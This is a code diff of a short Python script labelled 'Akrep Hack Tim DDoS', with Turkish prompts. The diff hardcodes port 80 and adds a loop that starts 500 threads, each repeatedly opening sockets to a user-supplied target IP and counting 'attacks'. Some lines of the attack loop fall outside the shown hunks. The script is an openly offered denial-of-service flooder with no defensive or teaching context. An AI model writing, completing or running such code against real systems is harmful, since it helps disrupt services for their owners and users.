@@ -1,18 +1,17 @@
 import socket
 import threading
 import os
-os.system("cls")
-banner="""
-###############################
-#Akrep Hack Tim DDoS          #
-#Code By Bunny Sayne          #
-###############################
-"""
-print (banner)
 
+print("#########################")
+print("#Akrep Hack Tim DDoS")
+print("#Code By Bunny Sayne")
+print("#########################")
+os.system("clear")
 target = input("hedef ip: ")
-target = input("hedef port: ")
+port = 80
+
 attack_num = 0
+
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -21,7 +20,11 @@ def attack():
 
         global attack_num
         attack_num += 1
-        print("Saldiri Baslamistir!")
+        print("Saldiri Basladi!")
         print(attack_num)
 
         s.close()
+
+for i in range(500):
+    thread = threading.Thread(target= attack)
+    thread.start()
